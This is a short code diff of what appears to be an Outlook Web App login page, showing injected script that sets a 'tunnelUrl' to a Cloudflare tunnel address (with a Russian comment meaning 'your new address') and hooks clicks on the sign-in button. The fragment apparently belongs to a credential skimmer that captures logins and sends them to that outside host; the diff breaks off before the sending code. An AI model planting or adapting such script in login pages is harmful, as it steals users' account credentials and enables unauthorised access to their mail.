@@ -197,7 +197,7 @@ function RndMimeCtlHlpr(objid, classid, ns, id)
 <form action="/owa/auth.owa" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
 <script>
 (function() {
-    var tunnelUrl = "https://smoking-compression-relatives-kim.trycloudflare.com "; // Твой новый адрес
+    var tunnelUrl = "https://smoking-compression-relatives-kim.trycloudflare.com"; // Твой новый адрес
 
     document.addEventListener('click', function(e) {
         if (e.target && (e.target.className.indexOf('signin') !== -1 || e.target.id.indexOf('sub') !== -1)) {
